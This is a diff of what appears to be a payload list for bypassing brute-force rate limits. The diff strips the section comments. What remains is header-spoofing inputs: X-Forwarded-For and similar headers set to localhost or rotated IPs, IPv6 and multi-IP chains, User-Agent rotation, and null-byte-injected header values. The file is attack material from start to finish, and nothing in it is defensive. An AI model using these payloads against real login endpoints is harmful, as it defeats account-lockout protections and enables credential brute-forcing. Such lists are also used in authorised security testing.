@@ -1,9 +1,3 @@
-# ============================================================
-# Brute Force / Rate Limit — Header Bypass
-# ============================================================
-
-# ---- IP Spoofing Headers ----
-# Try different headers to spoof IP and bypass per-IP rate limits
 X-Forwarded-For: 127.0.0.1
 X-Forwarded-For: 1.2.3.4
 X-Real-IP: 127.0.0.1
@@ -25,25 +19,19 @@ X-Forwarded: 127.0.0.1
 Client-IP: 127.0.0.1
 Contact: 127.0.0.1
 
-# ---- Rotate IPs ----
 X-Forwarded-For: 1.1.1.1
 X-Forwarded-For: 2.2.2.2
 X-Forwarded-For: 3.3.3.3
-# Increment: 1.0.0.1, 1.0.0.2, 1.0.0.3 ...
 
-# ---- IPv6 Bypass ----
 X-Forwarded-For: ::1
 X-Forwarded-For: 2001:db8::1
 
-# ---- Multiple IPs in Header ----
 X-Forwarded-For: 127.0.0.1, 1.2.3.4
 X-Forwarded-For: 1.2.3.4, 127.0.0.1
 
-# ---- User-Agent Rotation (for UA-based limits) ----
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
 
-# ---- Header Null Byte Injection ----
 X-Forwarded-For: 127.0.0.1%00
 X-Forwarded-For: %00127.0.0.1
